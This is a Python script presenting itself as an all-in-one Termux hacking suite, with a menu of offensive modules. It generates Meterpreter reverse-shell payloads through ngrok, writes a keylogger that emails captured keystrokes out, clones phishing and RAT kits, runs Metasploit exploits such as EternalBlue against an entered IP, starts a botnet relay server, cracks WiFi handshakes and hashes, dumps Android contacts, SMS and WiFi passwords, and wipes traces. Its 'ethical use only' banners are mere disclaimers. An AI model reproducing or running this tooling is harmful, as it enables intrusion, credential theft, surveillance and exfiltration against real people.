#!/usr/bin/env python3
# ===========================================================
# 🔥 MAKETI v5.0 - ALL-IN-ONE TERMUX HACKING SUITE 🔥
# 📦 SINGLE FILE - NO MODULES NEEDED!
# 🛡️ "Ethical Hacking Only - With Great Power Comes Responsibility"
# ===========================================================

import os
import sys
import time
import random
import json
import subprocess
import socket
import requests
import hashlib
import base64
import threading
import re
from datetime import datetime

# ========== COLOR CODES ==========
R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
B = "\033[1;34m"
C = "\033[1;36m"
M = "\033[1;35m"
W = "\033[0m"
BLINK = "\033[5m"
BOLD = "\033[1m"

# ========== CONFIG ==========
VERSION = "5.0"
AUTHOR = "MAKETI MASTER"
LOG_FILE = "/sdcard/Download/maketi_log.txt"

# ========== BANNER ==========
def banner():
    os.system("clear")
    print(C + """
    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║   ███╗   ███╗ █████╗ ██╗  ██╗███████╗████████╗██╗     ║
    ║   ████╗ ████║██╔══██╗██║ ██╔╝██╔════╝╚══██╔══╝██║     ║
    ║   ██╔████╔██║███████║█████╔╝ █████╗     ██║   ██║     ║
    ║   ██║╚██╔╝██║██╔══██║██╔═██╗ ██╔══╝     ██║   ██║     ║
    ║   ██║ ╚═╝ ██║██║  ██║██║  ██╗███████╗   ██║   ██║     ║
    ║   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝     ║
    ║                                                          ║
    ║   """ + R + """🔥 ULTIMATE TERMUX HACKING SUITE 🔥""" + C + """          ║
    ║   """ + Y + f"""v{VERSION}  |  Author: {AUTHOR}""" + C + """                ║
    ║   """ + G + """🛡️  Ethical Hacking Only  """ + C + """                    ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
    """ + W)

# ========== LOADING SCREEN ==========
def loading_screen():
    print(Y + "\n[+] Initializing MAKETI v5.0..." + W)
    
    steps = [
        "Loading core modules",
        "Checking dependencies",
        "Connecting to GitHub",
        "Verifying security",
        "System ready!"
    ]
    
    for i in range(101):
        progress = "=" * (i // 5) + " " * (20 - (i // 5))
        print(f"\r[{i:3}%] [{progress}]", end="")
        time.sleep(0.015)
        if i % 20 == 0 and i > 0:
            print(f"\n{G}[✓] {steps[i//20 - 1]}{W}")
    
    print("\n" + G + "[✓] MAKETI v5.0 Successfully Loaded!" + W)
    time.sleep(0.5)

# ========== MATRIX EFFECT ==========
def matrix_effect():
    chars = "01"
    for _ in range(10):
        line = "".join(random.choice(chars) for _ in range(60))
        print(G + line + W, end="\r")
        time.sleep(0.05)
    print("\n" + G + "[+] System Secure & Ready" + W)

# ========== LOGGING ==========
def log(message):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now()}] {message}\n")

# ========== CHECK ROOT ==========
def check_root():
    if os.geteuid() == 0:
        print(G + "[✓] Root access available!" + W)
        return True
    print(Y + "[!] Root not available - some features limited" + W)
    return False

# ========== MENU ==========
def menu():
    banner()
    print(M + """
    ╔══════════════════════════════════════════════╗
    ║  🎯 MAIN MENU - MAKETI v5.0                 ║
    ╠══════════════════════════════════════════════╣
    ║  [01] 📱 ADVANCE PAYLOAD GENERATOR          ║
    ║  [02] 🎣 PHISHING KIT PRO                  ║
    ║  [03] 🕵️ OSINT AUTOMATION                 ║
    ║  [04] 💀 DDOS ATTACK SUITE                ║
    ║  [05] 📡 WIFI HACK PRO                    ║
    ║  [06] 🔑 PASSWORD CRACKER                 ║
    ║  [07] 🐍 KEYLOGGER BUILDER               ║
    ║  [08] 🌐 WEB VULNERABILITY SCANNER       ║
    ║  [09] 📧 EMAIL/PHONE OSINT               ║
    ║  [10] 🤖 AUTO-EXPLOIT ENGINE             ║
    ║  [11] 🧬 RAT BUILDER                     ║
    ║  [12] 🔄 BOTNET CONTROLLER               ║
    ║  [13] 🛡️ ANONYMOUS VPN                   ║
    ║  [14] 💾 DATA EXTRACTOR                  ║
    ║  [15] 🧹 SYSTEM CLEANER                  ║
    ║  [16] ⚙️ AUTO-INSTALL ALL               ║
    ║  [17] ❌ EXIT                           ║
    ╚══════════════════════════════════════════════╝
    """ + W)
    print(C + "="*50 + W)
    print(Y + "[!] ONLY FOR EDUCATIONAL PURPOSE!" + W)
    print(R + "[!] Illegal use = 7 years jail + 5 crore fine" + W)
    print(C + "="*50 + W)

# ===========================================================
# 1. PAYLOAD GENERATOR
# ===========================================================
def advance_payload():
    print(Y + "\n[+] ADVANCE PAYLOAD GENERATOR" + W)
    print(C + "[1] Android APK" + W)
    print(C + "[2] Windows EXE" + W)
    print(C + "[3] Linux ELF" + W)
    choice = input(G + "[?] Choose: " + W)
    
    # Start Ngrok
    os.system("pkill ngrok 2>/dev/null")
    os.system("ngrok tcp 4444 &")
    time.sleep(2)
    print(Y + "[+] Ngrok started! Get URL from: http://localhost:4040" + W)
    
    url = input(G + "[?] Ngrok URL (ex: 0.tcp.in.ngrok.io:12345): " + W)
    host, port = url.split(":")
    
    payloads = {
        "1": f"msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} -o /sdcard/Download/evil.apk",
        "2": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe -o /sdcard/Download/evil.exe",
        "3": f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f elf -o /sdcard/Download/evil.elf"
    }
    
    os.system(payloads.get(choice, payloads["1"]))
    print(G + "[✓] Payload ready in /sdcard/Download/" + W)
    log("Payload generated")

# ===========================================================
# 2. PHISHING PRO
# ===========================================================
def phishing_pro():
    print(Y + "\n[+] PHISHING KIT PRO" + W)
    os.system("git clone https://github.com/htr-tech/zphisher --depth 1")
    os.chdir("zphisher")
    print(G + "[✓] Zphisher installed!" + W)
    print(Y + "[!] Run: cd zphisher && bash zphisher.sh" + W)
    os.chdir("..")

# ===========================================================
# 3. OSINT AUTOMATION
# ===========================================================
def osint_automation():
    print(Y + "\n[+] OSINT AUTOMATION" + W)
    target = input(G + "[?] Target username/email/phone: " + W)
    
    tools = [
        ("sherlock", f"sherlock {target}"),
        ("theHarvester", f"theharvester -d {target} -b all"),
        ("phoneinfoga", f"phoneinfoga scan -n {target}")
    ]
    
    for tool, cmd in tools:
        print(Y + f"[+] Running {tool}..." + W)
        os.system(f"pkg install {tool} -y 2>/dev/null")
        os.system(cmd + " >> /sdcard/Download/osint_result.txt")
    
    print(G + "[✓] OSINT complete! Check: /sdcard/Download/osint_result.txt" + W)
    log("OSINT scanned: " + target)

# ===========================================================
# 4. DDOS SUITE
# ===========================================================
def ddos_suite():
    print(Y + "\n[+] DDOS ATTACK SUITE" + W)
    print(R + "[!] STRICT: Sirf apne server par chalao!" + W)
    ip = input(G + "[?] Target IP (localhost recommended): " + W)
    port = input(G + "[?] Port (80/443): " + W)
    
    print(C + "[1] Slowloris (HTTP)" + W)
    print(C + "[2] UDP Flood" + W)
    choice = input(G + "[?] Choose: " + W)
    
    if choice == "1":
        os.system(f"python3 -c 'import socket; s=socket.socket(); s.connect((\"{ip}\", {port})); s.send(b\"GET / HTTP/1.1\\r\\n\")'")
    elif choice == "2":
        os.system(f"python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.sendto(b\"X\"*1024, (\"{ip}\", {port}))'")

# ===========================================================
# 5. WIFI HACK PRO
# ===========================================================
def wifi_hack_pro():
    print(Y + "\n[+] WIFI HACK PRO" + W)
    if not check_root():
        return
    
    os.system("pkg install aircrack-ng -y")
    print(Y + "[+] Scanning WiFi..." + W)
    os.system("airmon-ng start wlan0")
    os.system("airodump-ng wlan0mon")
    
    bssid = input(G + "[?] Target BSSID: " + W)
    channel = input(G + "[?] Channel: " + W)
    
    print(Y + "[+] Capturing handshake..." + W)
    os.system(f"airodump-ng -c {channel} --bssid {bssid} -w capture wlan0mon")
    print(Y + "[+] Attempting crack..." + W)
    os.system(f"aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap")

# ===========================================================
# 6. PASSWORD CRACKER
# ===========================================================
def password_cracker():
    print(Y + "\n[+] PASSWORD CRACKER" + W)
    print(C + "[1] MD5 Hash" + W)
    print(C + "[2] SHA1 Hash" + W)
    print(C + "[3] ZIP Password" + W)
    choice = input(G + "[?] Choose: " + W)
    hash_input = input(G + "[?] Enter hash/path: " + W)
    
    if choice == "1":
        os.system(f"hashcat -m 0 {hash_input} /usr/share/wordlists/rockyou.txt")
    elif choice == "2":
        os.system(f"hashcat -m 100 {hash_input} /usr/share/wordlists/rockyou.txt")
    elif choice == "3":
        os.system(f"fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt {hash_input}")

# ===========================================================
# 7. KEYLOGGER BUILDER
# ===========================================================
def keylogger_builder():
    print(Y + "\n[+] KEYLOGGER BUILDER" + W)
    email = input(G + "[?] Email for logs: " + W)
    
    code = f'''
import pynput.keyboard
import smtplib
import threading
log = ""
def on_press(key):
    global log
    log += str(key).replace("'", "")
    if len(log) > 50:
        send_email()
        log = ""
def send_email():
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login("{email}", "your_password")
    server.sendmail("{email}", "{email}", log)
    server.quit()
listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
'''
    with open("/sdcard/Download/keylogger.py", "w") as f:
        f.write(code)
    print(G + "[✓] Keylogger created in /sdcard/Download/" + W)

# ===========================================================
# 8. WEB SCANNER
# ===========================================================
def web_scanner():
    print(Y + "\n[+] WEB VULNERABILITY SCANNER" + W)
    url = input(G + "[?] Target URL: " + W)
    
    print(Y + "[+] Running SQLMap..." + W)
    os.system(f"sqlmap -u {url} --batch --level=2")
    
    print(Y + "[+] Running Nikto..." + W)
    os.system(f"nikto -h {url}")

# ===========================================================
# 9. EMAIL/PHONE OSINT
# ===========================================================
def email_phone_osint():
    print(Y + "\n[+] EMAIL/PHONE OSINT" + W)
    target = input(G + "[?] Enter email or phone: " + W)
    
    platforms = ["instagram", "facebook", "twitter", "github"]
    for platform in platforms:
        print(Y + f"[+] Checking {platform}..." + W)
        os.system(f"curl -s https://{platform}.com/{target}")
    
    print(G + "[✓] OSINT check complete!" + W)

# ===========================================================
# 10. AUTO-EXPLOIT
# ===========================================================
def auto_exploit():
    print(Y + "\n[+] AUTO-EXPLOIT ENGINE" + W)
    print(R + "[!] ONLY FOR CTF/LAB USE!" + W)
    target = input(G + "[?] Target IP: " + W)
    
    exploits = [
        ("EternalBlue", f"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; exploit"),
        ("Shellshock", f"use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS {target}; exploit")
    ]
    
    for name, cmd in exploits:
        print(Y + f"[+] Trying {name}..." + W)
        os.system(f"msfconsole -q -x '{cmd}'")
    
    log("Auto-exploit on " + target)

# ===========================================================
# 11. RAT BUILDER
# ===========================================================
def rat_builder():
    print(Y + "\n[+] RAT BUILDER" + W)
    print(C + "[1] Android RAT" + W)
    print(C + "[2] Windows RAT" + W)
    choice = input(G + "[?] Choose: " + W)
    
    ip = input(G + "[?] Listener IP (Ngrok URL): " + W)
    port = input(G + "[?] Port: " + W)
    
    os.system(f"git clone https://github.com/eviltik/ShadowRAT")
    os.chdir("ShadowRAT")
    os.system(f"python3 shadow.py --host {ip} --port {port}")
    os.chdir("..")

# ===========================================================
# 12. BOTNET CONTROLLER
# ===========================================================
def botnet_controller():
    print(Y + "\n[+] BOTNET CONTROLLER" + W)
    print(Y + "[!] Starting C2 server..." + W)
    
    # Simple botnet server
    os.system("""
    python3 -c '
import socket, threading
clients = []
def handle_client(conn):
    while True:
        data = conn.recv(1024)
        for client in clients:
            if client != conn:
                client.send(data)
server = socket.socket()
server.bind(("0.0.0.0", 4444))
server.listen(5)
print("[+] Botnet Server Running on port 4444")
while True:
    conn, addr = server.accept()
    clients.append(conn)
    threading.Thread(target=handle_client, args=(conn,)).start()
' &
    """)
    print(G + "[✓] Botnet server started on port 4444!" + W)

# ===========================================================
# 13. ANONYMOUS VPN
# ===========================================================
def anonymous_vpn():
    print(Y + "\n[+] ANONYMOUS VPN" + W)
    print(C + "[1] OpenVPN" + W)
    print(C + "[2] Tor Proxy" + W)
    choice = input(G + "[?] Choose: " + W)
    
    if choice == "1":
        os.system("pkg install openvpn -y")
        print(Y + "[+] Downloading VPN config..." + W)
        os.system("cd /sdcard/Download && wget https://www.vpnbook.com/free-openvpn-account/VPNBook.com-OpenVPN-Euro1.zip")
        print(G + "[✓] VPN config downloaded!" + W)
    elif choice == "2":
        os.system("pkg install tor -y && tor &")
        print(G + "[✓] Tor proxy on 127.0.0.1:9050" + W)

# ===========================================================
# 14. DATA EXTRACTOR
# ===========================================================
def data_extractor():
    print(Y + "\n[+] DATA EXTRACTOR" + W)
    print(C + "[1] Contacts" + W)
    print(C + "[2] SMS" + W)
    print(C + "[3] WiFi Passwords" + W)
    choice = input(G + "[?] Choose: " + W)
    
    if choice == "1":
        os.system("content query --uri content://contacts/phones/ >> /sdcard/Download/contacts.txt")
    elif choice == "2":
        os.system("content query --uri content://sms/inbox >> /sdcard/Download/sms.txt")
    elif choice == "3":
        os.system("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null >> /sdcard/Download/wifi.txt")
    
    print(G + "[✓] Data extracted to /sdcard/Download/" + W)

# ===========================================================
# 15. SYSTEM CLEANER
# ===========================================================
def system_cleaner():
    print(Y + "\n[+] SYSTEM CLEANER" + W)
    os.system("rm -rf ~/.cache/*")
    os.system("rm -rf /sdcard/Download/*.apk 2>/dev/null")
    os.system("rm -rf /sdcard/Download/*.exe 2>/dev/null")
    os.system("pkill ngrok 2>/dev/null")
    os.system("pkill tor 2>/dev/null")
    print(G + "[✓] System cleaned!" + W)

# ===========================================================
# 16. AUTO-INSTALL ALL
# ===========================================================
def auto_install():
    print(Y + "\n[+] AUTO-INSTALL ALL DEPENDENCIES" + W)
    packages = [
        "python", "python2", "git", "wget", "curl", "openssh",
        "nmap", "metasploit", "sqlmap", "theharvester", "ngrok",
        "tor", "apktool", "aircrack-ng", "hashcat", "sherlock"
    ]
    for pkg in packages:
        print(Y + f"[+] Installing {pkg}..." + W)
        os.system(f"pkg install {pkg} -y")
    print(G + "[✓] All dependencies installed!" + W)

# ===========================================================
# 17. EXIT
# ===========================================================
def exit_tool():
    print(R + """
    ╔══════════════════════════════════════╗
    ║  🔥 THANK YOU FOR USING MAKETI 🔥   ║
    ║  🛡️  Stay Ethical, Stay Safe        ║
    ║  💻 Author: MAKETI MASTER           ║
    ╚══════════════════════════════════════╝
    """ + W)
    sys.exit()

# ===========================================================
# MAIN FUNCTION
# ===========================================================
def main():
    # Show loading screen
    loading_screen()
    matrix_effect()
    time.sleep(1)
    
    while True:
        menu()
        choice = input(G + "\n[?] Enter choice (1-17): " + W)
        
        options = {
            "1": advance_payload,
            "2": phishing_pro,
            "3": osint_automation,
            "4": ddos_suite,
            "5": wifi_hack_pro,
            "6": password_cracker,
            "7": keylogger_builder,
            "8": web_scanner,
            "9": email_phone_osint,
            "10": auto_exploit,
            "11": rat_builder,
            "12": botnet_controller,
            "13": anonymous_vpn,
            "14": data_extractor,
            "15": system_cleaner,
            "16": auto_install,
            "17": exit_tool
        }
        
        if choice in options:
            options[choice]()
            input(Y + "\n[Press Enter to continue...]" + W)
        else:
            print(R + "[X] Invalid choice!" + W)

if __name__ == "__main__":
    main()